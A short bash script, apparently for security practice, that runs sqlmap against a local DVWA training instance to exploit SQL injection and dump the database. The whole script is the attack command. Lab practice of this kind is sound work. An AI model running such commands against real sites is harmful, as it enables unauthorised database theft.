#!/bin/bash
echo 'Running SQLMap...'
sqlmap -u 'http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=xxxx' --batch --dump --output-dir=output